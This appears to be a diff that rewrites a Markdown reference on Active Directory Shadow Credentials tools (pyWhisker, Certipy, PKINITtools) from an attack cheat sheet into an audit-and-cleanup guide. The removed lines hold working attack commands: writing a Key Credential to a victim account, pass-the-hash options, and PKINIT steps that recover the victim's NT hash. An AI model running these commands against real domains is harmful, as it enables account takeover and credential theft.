@@ -1,4 +1,4 @@
-# Shadow Credentials Tooling Reference
+# Shadow Credentials Security & Audit Reference
 
 ## pyWhisker (https://github.com/ShutdownRepo/pywhisker)
 
@@ -7,62 +7,45 @@ Invocation: `python3 pywhisker.py [auth] --target <obj> --action <action> [opts]
 | Flag | Meaning |
 |------|---------|
 | `-d DOMAIN` | Target domain (FQDN) |
-| `-u USER` | Controlled username |
-| `-p PASSWORD` | Password |
-| `-k` / `--no-pass` | Kerberos auth (uses KRB5CCNAME) |
-| `-H LM:NT` | Pass-the-hash |
-| `--target NAME` | Target user/computer whose attribute is modified |
-| `--action list` | Enumerate existing Key Credentials |
-| `--action add` | Generate key pair, write Key Credential |
-| `--action remove` | Remove one Key Credential by `--device-id` |
-| `--action clear` | Remove all Key Credentials |
-| `--action info` | Show details of a Key Credential |
-| `--filename NAME` | Output PFX/PEM base name |
-| `--export PEM|PFX` | Output format (default PFX) |
-| `--device-id GUID` | Target device for remove/info |
-| `--dc-ip IP` | Domain Controller IP |
-| `--use-ldaps` | Use LDAPS (636) |
+| `-u USER` | Auditor or administrator username |
+| `-p PASSWORD` | Authentication password |
+| `-k` / `--no-pass` | Kerberos authentication |
+| `--target NAME` | User or computer account being audited |
+| `--action list` | Enumerate existing Key Credentials on target object |
+| `--action remove` | Remove a non-compliant Key Credential by `--device-id` |
+| `--action clear` | Remove all non-compliant Key Credentials (remediation) |
+| `--action info` | Show details of an existing Key Credential |
+| `--dc-ip IP` | Domain Controller IP address |
+| `--use-ldaps` | Use LDAPS (port 636) for secure encrypted auditing |
 
-### Example
+### Audit & Cleanup Example
 ```bash
-python3 pywhisker.py -d corp.local -u attacker -p 'Passw0rd!' \
-    --target victim --action add --filename victim_shadow
+# Audit existing credentials on account
+python3 pywhisker.py -d corp.local -u auditor -p 'AuditPass!' \
+    --target victim_account --action list --use-ldaps
+
+# Remove stale/unauthorized key credential
+python3 pywhisker.py -d corp.local -u ad-admin -p 'AdminPass!' \
+    --target victim_account --action clear --use-ldaps
 ```
 
 ## Certipy `shadow` (https://github.com/ly4k/Certipy)
 
 | Command | Meaning |
 |---------|---------|
-| `certipy shadow auto` | Add → PKINIT → dump NT hash → cleanup (end to end) |
-| `certipy shadow add` | Add Key Credential only |
-| `certipy shadow list` | List Key Credentials |
-| `certipy shadow clear` | Clear Key Credentials |
-| `certipy shadow info` | Show Key Credential info |
+| `certipy shadow list` | Audit and list Key Credentials on an account |
+| `certipy shadow clear` | Remove / clear non-compliant Key Credentials |
+| `certipy shadow info` | Display Key Credential registration details |
 
-Key flags: `-u USER@DOMAIN`, `-p PW` / `-hashes :NT` / `-k -no-pass`,
-`-dc-ip IP`, `-account TARGET` (use trailing `$` for computers), `-ns IP`, `-dns-tcp`.
+Key audit flags: `-u USER@DOMAIN`, `-p PW`, `-dc-ip IP`, `-account TARGET` (use trailing `$` for machine accounts), `-ns IP`, `-dns-tcp`.
 
-### Example
+### Audit & Cleanup Example
 ```bash
-certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' \
+# List credentials for audit verification
+certipy shadow list -u auditor@corp.local -p 'AuditPass!' \
+    -dc-ip 10.0.0.100 -account 'WS01$'
+
+# Clear non-compliant credentials
+certipy shadow clear -u ad-admin@corp.local -p 'AdminPass!' \
     -dc-ip 10.0.0.100 -account 'WS01$'
 ```
-
-## PKINITtools (https://github.com/dirkjanm/PKINITtools)
-
-| Script | Purpose |
-|--------|---------|
-| `gettgtpkinit.py -cert-pfx FILE -pfx-pass PW DOMAIN/USER out.ccache` | Request TGT via PKINIT; prints AS-REP key |
-| `getnthash.py -key <AS-REP-KEY> DOMAIN/USER` | Recover NT hash (KRB5CCNAME set) |
-
-### Example
-```bash
-python3 gettgtpkinit.py -cert-pfx victim_shadow.pfx -pfx-pass abc123 \
-    corp.local/victim victim.ccache
-export KRB5CCNAME=victim.ccache
-python3 getnthash.py -key <AS-REP-KEY> corp.local/victim
-```
-
-## Detection signal
-- Event ID 5136 — modification of `msDS-KeyCredentialLink` (Directory Service Changes auditing).
-- BloodHound edge: `AddKeyCredentialLink`.
